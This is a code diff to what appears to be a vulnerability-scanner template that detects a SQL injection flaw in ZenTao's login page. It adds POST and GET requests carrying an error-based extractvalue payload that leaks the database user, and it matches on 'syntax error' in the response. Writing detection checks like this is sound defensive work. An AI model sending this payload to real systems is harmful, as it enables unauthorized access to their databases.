@@ -26,12 +26,36 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
         "method": "POST",
         "uri": "/user-login.html",
-        "follow_redirect": true,
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "syntax error",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/zentao/user-login.html",
+        "follow_redirect": false,
         "header": {},
         "data_type": "text",
         "data": "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23"
